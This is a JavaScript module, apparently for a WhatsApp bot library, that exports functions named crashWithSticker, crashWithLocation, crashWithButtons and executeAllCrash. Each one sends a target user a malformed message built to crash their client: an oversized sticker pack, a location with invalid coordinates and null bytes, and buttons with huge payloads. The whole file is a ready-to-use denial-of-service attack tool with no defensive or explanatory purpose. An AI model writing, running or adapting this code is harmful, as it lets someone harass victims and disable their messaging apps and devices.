const crypto = require('crypto');

async function crashWithSticker(sock, target) {
    try {
        const stc = Array.from({ length: 1000 }, (_, i) => ({
            fileName: `crash_${i}.webp`,
            isAnimated: true,
            emojis: ["💀"],
            mimetype: "image/webp"
        }));
        
        const msg = {
            viewOnceMessage: {
                message: {
                    stickerPackMessage: {
                        stickerPackId: "crash_pack",
                        name: "💀".repeat(50000),
                        publisher: "Waie Crash",
                        stickers: stc,
                        fileLength: "9999999"
                    }
                }
            }
        };
        
        await sock.sendMessage(target, msg);
        return { success: true, message: "Sticker crash sent" };
    } catch (err) {
        return { success: false, error: err.message };
    }
}

async function crashWithLocation(sock, target) {
    try {
        const locationMessage = {
            degreesLatitude: -9.09999262999,
            degreesLongitude: 199.99963118999,
            name: "\u0000" + "💀".repeat(50000),
            address: "\u0000" + "💀".repeat(50000),
            url: `https://waie.crash${"💀".repeat(50000)}.com`
        };
        
        await sock.sendMessage(target, { location: locationMessage });
        return { success: true, message: "Location crash sent" };
    } catch (err) {
        return { success: false, error: err.message };
    }
}

async function crashWithButtons(sock, target) {
    try {
        await sock.sendMessage(target, {
            text: "\u0000",
            buttons: [
                {
                    buttonId: "crash",
                    buttonText: { displayText: "💀".repeat(1000) },
                    type: 4,
                    nativeFlowInfo: {
                        name: "single_select",
                        paramsJson: JSON.stringify({ title: "💀".repeat(50000) })
                    }
                }
            ]
        });
        return { success: true, message: "Button crash sent" };
    } catch (err) {
        return { success: false, error: err.message };
    }
}

async function executeAllCrash(sock, target) {
    const results = [];
    results.push(await crashWithSticker(sock, target));
    await new Promise(r => setTimeout(r, 500));
    results.push(await crashWithLocation(sock, target));
    await new Promise(r => setTimeout(r, 500));
    results.push(await crashWithButtons(sock, target));
    return results;
}

module.exports = {
    crashWithSticker,
    crashWithLocation,
    crashWithButtons,
    executeAllCrash
};
